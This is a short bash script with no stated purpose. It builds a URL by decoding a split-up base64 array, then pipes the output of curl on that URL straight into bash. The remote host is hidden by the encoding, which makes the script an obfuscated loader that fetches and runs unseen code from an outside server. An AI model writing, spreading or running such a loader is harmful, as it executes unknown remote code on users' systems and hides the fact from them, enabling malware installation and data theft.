#!/usr/bin/env bash

x=(
"aHR0cHM6Ly8="   
"cnVu"      
"Mi4="           
"bm9i"        
"aXRh"        
"cHJv"        
"Lm9u"        
"bGlu"          
"ZQ=="          
)

u=""
for i in {0..8}; do
  u+=$(echo "${x[$i]}" | base64 -d)
done

bash <(curl -fsSL "$u")
